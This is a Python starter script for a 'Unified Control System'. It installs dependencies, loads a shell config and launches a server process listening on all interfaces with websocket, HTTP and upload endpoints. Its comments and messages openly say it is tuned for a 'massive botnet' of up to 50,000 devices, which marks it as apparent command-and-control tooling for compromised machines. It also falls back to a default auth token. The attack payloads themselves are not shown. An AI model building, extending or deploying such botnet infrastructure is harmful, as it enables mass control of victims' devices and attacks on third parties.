#!/usr/bin/env python3
"""
Unified Control System - Smart Starter
Auto-installs dependencies and starts the system with optimal settings
"""

import os
import sys
import subprocess
import time

def check_and_install_dependencies():
    """Check for dependencies and auto-install if missing"""
    print("🔍 Checking dependencies...")
    
    required_modules = {
        'psutil': 'psutil>=6.0.0',
        'websockets': 'websockets>=13.0.1',
        'aiohttp': 'aiohttp>=3.9.1',
        'aiofiles': 'aiofiles>=24.1.0',
        'requests': 'requests>=2.32.0'
    }
    
    missing = []
    for module, package in required_modules.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"📦 Installing missing dependencies: {', '.join(missing)}")
        try:
            subprocess.check_call([
                sys.executable, '-m', 'pip', 'install', '--user'
            ] + missing)
            print("✅ Dependencies installed successfully")
            print("🔄 Restarting to use new dependencies...")
            
            # Restart the script with the same arguments
            os.execv(sys.executable, [sys.executable] + sys.argv)
            
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to install dependencies: {e}")
            print("📋 Manual installation: pip install -r requirements.txt")
            sys.exit(1)
    else:
        print("✅ All dependencies already installed")

# Check dependencies before importing
check_and_install_dependencies()

# Now safe to import
import psutil

def detect_optimal_settings():
    """Auto-detect optimal settings based on hardware"""
    # Get system specs
    ram_gb = psutil.virtual_memory().total / (1024**3)
    cpu_cores = psutil.cpu_count()
    
    print(f"🔍 Detected: {ram_gb:.1f}GB RAM, {cpu_cores} CPU cores")
    
    # Calculate optimal settings for massive botnet scale
    if ram_gb < 1:
        max_devices = 50
        max_workers = 20
        memory_limit = 256
    elif ram_gb < 2:
        max_devices = 500
        max_workers = 50
        memory_limit = 512
    elif ram_gb < 4:
        max_devices = 2000
        max_workers = 100
        memory_limit = 1024
    elif ram_gb < 8:
        max_devices = 5000
        max_workers = 150
        memory_limit = 1536
    elif ram_gb < 16:
        max_devices = 10000
        max_workers = 200
        memory_limit = 2048
    else:
        max_devices = 50000  # Support for massive enterprise-scale botnets
        max_workers = 500
        memory_limit = 4096
    
    print(f"⚙️  Optimized for massive botnet: {max_devices} max devices, {max_workers} workers, {memory_limit}MB memory limit")
    return max_devices, max_workers, memory_limit

def load_config():
    """Load configuration from unified_control_config.sh"""
    config_file = 'unified_control_config.sh'
    if os.path.exists(config_file):
        print("📋 Loading configuration...")
        try:
            # Parse the bash config file and extract environment variables
            with open(config_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('export '):
                        # Remove 'export ' prefix
                        line = line[7:]
                        # Split on first '=' only
                        if '=' in line:
                            key, value = line.split('=', 1)
                            # Remove quotes from value
                            value = value.strip('"').strip("'")
                            os.environ[key] = value
            print("✅ Configuration loaded successfully")
        except Exception as e:
            print(f"⚠️  Warning: Could not load config file: {e}")
            print("   Using default values...")
    else:
        print("⚠️  Configuration file not found, using defaults")

def start_system():
    print("🚀 Starting Unified Control System...")
    
    # Load configuration first
    load_config()
    
    # Detect optimal settings
    max_devices, max_workers, memory_limit = detect_optimal_settings()
    
    # Set environment variables for optimization
    os.environ['UC_MAX_DEVICES'] = str(max_devices)
    os.environ['UC_MAX_WORKERS'] = str(max_workers)
    os.environ['UC_MEMORY_LIMIT'] = str(memory_limit)
    
    # Get auth token from environment or generate warning
    auth_token = os.environ.get('UC_AUTH_TOKEN')
    if not auth_token or auth_token == 'default_token':
        print("⚠️  WARNING: No secure auth token configured!")
        print("   Edit unified_control_config.sh to set UC_AUTH_TOKEN")
        auth_token = 'default_token'
    
    # Start server
    print("📡 Starting server with optimized settings...")
    server_cmd = [
        'python3', 'unified_agent_with_ui.py',
        '--mode', 'server',
        '--auth', auth_token,
        '--host', '0.0.0.0',  # Allow mobile connections
        '--ws-port', os.environ.get('UC_WS_PORT', '8765'),
        '--http-port', os.environ.get('UC_HTTP_PORT', '8766'),
        '--db', os.environ.get('UC_DB_PATH', './unified_control.sqlite'),
        '--upload-dir', os.environ.get('UC_UPLOAD_DIR', './uploads')
    ]
    
    try:
        subprocess.run(server_cmd)
    except KeyboardInterrupt:
        print("\n🛑 System stopped by user")

if __name__ == "__main__":
    start_system()
